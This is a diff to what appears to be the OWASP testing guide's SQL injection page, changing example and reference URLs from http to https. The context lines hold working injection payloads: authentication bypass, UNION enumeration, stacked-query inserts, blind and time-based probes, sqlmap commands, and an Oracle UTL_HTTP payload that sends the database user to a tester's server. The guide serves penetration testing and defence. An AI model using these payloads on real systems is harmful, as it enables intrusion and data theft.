@@ -97,7 +97,7 @@ The query will be:
 
 If we suppose that the values of the parameters are sent to the server through the GET method, and if the domain of the vulnerable site is `www.example.com`, the request that we'll carry out will be:
 
-`http://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1&amp;password=1'%20or%20'1'%20=%20'1`
+`https://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1&amp;password=1'%20or%20'1'%20=%20'1`
 
 After a short analysis, we notice that the query returns a value (or a set of values) because the condition is always true (`OR 1=1`). In this way, the system has authenticated the user without knowing the username and password.
 
@@ -121,7 +121,7 @@ In this way, we'll get the following query:
 
 The request URL will be:
 
-`http://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1'))/*&amp;password=foo`
+`https://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1'))/*&amp;password=foo`
 
 This may return some values. Sometimes, the authentication code verifies that the number of returned records/results is exactly equal to 1. In the previous examples, this situation would be difficult (in the database there is only one value per user). To get around this problem, it is enough to insert an SQL command that imposes a condition that the number of the returned results must be one (one record returned). To reach this goal, we use the operator `LIMIT <num>`, where `<num>` is the number of the results/records that we want to be returned. Concerning the previous example, the value of the fields Username and Password will be modified as follows:
 
@@ -131,7 +131,7 @@ This may return some values. Sometimes, the authentication code verifies that th
 
 In this way, we create a request like the following:
 
-`http://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1'))%20LIMIT%201/*&amp;password=foo`
+`https://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1'))%20LIMIT%201/*&amp;password=foo`
 
 #### SELECT Statement
 
@@ -141,19 +141,19 @@ Consider the following SQL query:
 
 Consider also the request to a script that executes the query above:
 
-`http://www.example.com/product.php?id=10`
+`https://www.example.com/product.php?id=10`
 
 When the tester tries a valid value (e.g. 10 in this case), the application will return the description of a product. A good way to test if the application is vulnerable in this scenario is to play with logic, using the operators AND and OR.
 
 Consider the request:
 
-`http://www.example.com/product.php?id=10 AND 1=2`
+`https://www.example.com/product.php?id=10 AND 1=2`
 
 `SELECT * FROM products WHERE id_product=10 AND 1=2`
 
 In this case, probably the application would return some message telling us there is no content available or a blank page. Then the tester can send a true statement and check if there is a valid result:
 
-`http://www.example.com/product.php?id=10 AND 1=1`
+`https://www.example.com/product.php?id=10 AND 1=1`
 
 #### Stacked Queries
 
@@ -165,7 +165,7 @@ Consider the following SQL query:
 
 A way to exploit the above scenario would be:
 
-`http://www.example.com/product.php?id=10; INSERT INTO users (…)`
+`https://www.example.com/product.php?id=10; INSERT INTO users (…)`
 
 This way is possible to execute many queries in a row and independent of the first query.
 
@@ -240,7 +240,7 @@ The first detail a tester needs to find to exploit the SQL injection vulnerabili
 
 To achieve this, the tester can use the `ORDER BY` clause followed by a number indicating the numeration of the database’s column selected:
 
-`http://www.example.com/product.php?id=10 ORDER BY 10--`
+`https://www.example.com/product.php?id=10 ORDER BY 10--`
 
 If the query executes with success, the tester can assume in this example that there are 10 or more columns in the `SELECT` statement. If the query fails, then there must be fewer than 10 columns returned by the query. If there is an error message available, it would probably be:
 
@@ -248,7 +248,7 @@ If the query executes with success, the tester can assume in this example that t
 
 After the tester finds out the number of columns, the next step is to find out the type of columns. Assuming there were 3 columns in the example above, the tester could try each column type, using the NULL value to help them:
 
-`http://www.example.com/product.php?id=10 UNION SELECT 1,null,null--`
+`https://www.example.com/product.php?id=10 UNION SELECT 1,null,null--`
 
 If the query fails, the tester will probably see a message like:
 
@@ -256,11 +256,11 @@ If the query fails, the tester will probably see a message like:
 
 If the query executes with success, the first column can be an integer. Then the tester can move further and so on:
 
-`http://www.example.com/product.php?id=10 UNION SELECT 1,1,null--`
+`https://www.example.com/product.php?id=10 UNION SELECT 1,1,null--`
 
 After the successful information gathering, depending on the application, it may only show the tester the first result, because the application treats only the first line of the result set. In this case, it is possible to use a `LIMIT` clause or the tester can set an invalid value, making only the second query valid (supposing there is no entry in the database that has an ID that equals 99999):
 
-`http://www.example.com/product.php?id=99999 UNION SELECT 1,1,null--`
+`https://www.example.com/product.php?id=99999 UNION SELECT 1,1,null--`
 
 #### Hidden Union Exploitation Technique
 
@@ -470,7 +470,7 @@ This can be your payload for extracting the version of the database:
 So the target URL would be like this:
 
 ```text
-http://example.org/search?query=abcd'+AND+1=2+UNION+SELECT+"+'AND 1=2+UNION+SELECT+@@version+--+-"+--+-
+https://example.org/search?query=abcd'+AND+1=2+UNION+SELECT+"+'AND 1=2+UNION+SELECT+@@version+--+-"+--+-
 ```
 
 Automation:  
@@ -478,13 +478,13 @@ Automation:
 - _custom injection point marker_ (`*`):
 
   ```text
-  sqlmap -u "http://example.org/search?query=abcd'AND 1=2 UNION SELECT \"*\"-- -"
+  sqlmap -u "https://example.org/search?query=abcd'AND 1=2 UNION SELECT \"*\"-- -"
   ```
 
 - `--prefix` and `--suffix` flags:
 
   ```text
-  sqlmap -u "http://example.org/search?query=abcd" --prefix="'AND 1=2 UNION SELECT \"" --suffix="\"-- -"
+  sqlmap -u "https://example.org/search?query=abcd" --prefix="'AND 1=2 UNION SELECT \"" --suffix="\"-- -"
   ```
 
 #### Boolean Exploitation Technique
@@ -493,7 +493,7 @@ The Boolean exploitation technique is very useful when the tester finds a [Blind
 
 By using inference methods, it is possible to avoid this obstacle and thus succeed in recovering the values of some desired fields. This method consists of carrying out a series of boolean queries against the server, observing the answers, and finally deducing the meaning of such answers. We consider, as always, the `www.example.com` domain and we suppose that it contains a parameter named `id` vulnerable to SQL injection. This means that when carrying out the following request:
 
-`http://www.example.com/index.php?id=1'`
+`https://www.example.com/index.php?id=1'`
 
 We will get one page with a custom error message which is due to a syntactic error in the query. We suppose that the query executed on the server is:
 
@@ -549,11 +549,11 @@ Consider the following SQL query:
 
 Consider also the request to a script that executes the query above:
 
-`http://www.example.com/product.php?id=10`
+`https://www.example.com/product.php?id=10`
 
 The malicious request would be (e.g. Oracle 10g):
 
-`http://www.example.com/product.php?id=10||UTL_INADDR.GET_HOST_NAME( (SELECT user FROM DUAL) )--`
+`https://www.example.com/product.php?id=10||UTL_INADDR.GET_HOST_NAME( (SELECT user FROM DUAL) )--`
 
 In this example, the tester is concatenating the value 10 with the result of the function `UTL_INADDR.GET_HOST_NAME`. This Oracle function will try to return the hostname of the parameter passed to it, which is another query, the name of the user. When the database looks for a hostname with the user database name, it will fail and return an error message like:
 
@@ -571,11 +571,11 @@ Consider the following SQL query:
 
 Consider also the request to a script that executes the query above:
 
-`http://www.example.com/product.php?id=10`
+`https://www.example.com/product.php?id=10`
 
 The malicious request would be:
 
-`http://www.example.com/product.php?id=10||UTL_HTTP.request(‘testerserver.com:80’||(SELECT user FROM DUAL)--`
+`https://www.example.com/product.php?id=10||UTL_HTTP.request(‘testerserver.com:80’||(SELECT user FROM DUAL)--`
 
 In this example, the tester is concatenating the value 10 with the result of the function `UTL_HTTP.request`. This Oracle function will try to connect to `testerserver` and make an HTTP GET request containing the return from the query `SELECT user FROM DUAL`. The tester can set up a web server (e.g. Apache) or use the Netcat tool:
 
@@ -597,11 +597,11 @@ Consider the following SQL query:
 
 Consider also the request to a script that executes the query above:
 
-`http://www.example.com/product.php?id=10`
+`https://www.example.com/product.php?id=10`
 
 The malicious request would be (e.g. MySql 5.x):
 
-`http://www.example.com/product.php?id=10 AND IF(version() like ‘5%’, sleep(10), ‘false’))--`
+`https://www.example.com/product.php?id=10 AND IF(version() like ‘5%’, sleep(10), ‘false’))--`
 
 In this example the tester is checking whether the MySql version is 5.x or not, making the server to delay the answer by 10 seconds. The tester can increase the delay time and monitor the responses. The tester also doesn’t need to wait for the response. Sometimes he can set a very high value (e.g. 100) and cancel the request after some seconds.
 
@@ -794,7 +794,7 @@ For generic input validation security, refer to the [Input Validation CheatSheet
 ## Tools
 
 - [SQL Injection Fuzz Strings (from wfuzz tool) - Fuzzdb](https://github.com/fuzzdb-project/fuzzdb/tree/master/attack/sql-injection)
-- [Bernardo Damele A. G.: sqlmap, automatic SQL injection tool](http://sqlmap.org/)
+- [Bernardo Damele A. G.: sqlmap, automatic SQL injection tool](https://sqlmap.org/)
 - [Muhaimin Dzulfakar: MySqloit, MySql Injection takeover tool](https://github.com/dtrip/mysqloit)
 - [SQL Injection - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
 
@@ -817,14 +817,14 @@ Technology-specific Testing Guide pages have been created for the following DBMS
 
 ### Whitepapers
 
-- [Victor Chapela: "Advanced SQL Injection"](http://cs.unh.edu/~it666/reading_list/Web/advanced_sql_injection.pdf)
+- [Victor Chapela: "Advanced SQL Injection"](https://www.cs.unh.edu/~it666/reading_list/Web/advanced_sql_injection.pdf)
 - [Chris Anley: "More Advanced SQL Injection"](https://www.cgisecurity.com/lib/more_advanced_sql_injection.pdf)
 - [David Litchfield: "Data-mining with SQL Injection and Inference"](https://dl.packetstormsecurity.net/papers/attack/sqlinference.pdf)
 - [Imperva: "Blinded SQL Injection"](https://www.imperva.com/lg/lgw.asp?pid=369)
 - [PortSwigger: "SQL Injection Cheat Sheet"](https://portswigger.net/web-security/sql-injection/cheat-sheet)
 - [Kevin Spett from SPI Dynamics: "Blind SQL Injection"](https://repo.zenk-security.com/Techniques%20d.attaques%20%20.%20%20Failles/Blind_SQLInjection.pdf)
 - ["ZeQ3uL" (Prathan Phongthiproek) and "Suphot Boonchamnan": "Beyond SQLi: Obfuscate and Bypass"](https://www.exploit-db.com/papers/17934/)
-- [Adi Kaploun and Eliran Goshen, Check Point Threat Intelligence & Research Team: "The Latest SQL Injection Trends"](http://blog.checkpoint.com/2015/05/07/latest-sql-injection-trends/)
+- [Adi Kaploun and Eliran Goshen, Check Point Threat Intelligence & Research Team: "The Latest SQL Injection Trends"](https://blog.checkpoint.com/latest-sql-injection-trends/)
 
 ### Documentation on SQL Injection Vulnerabilities in Products
 
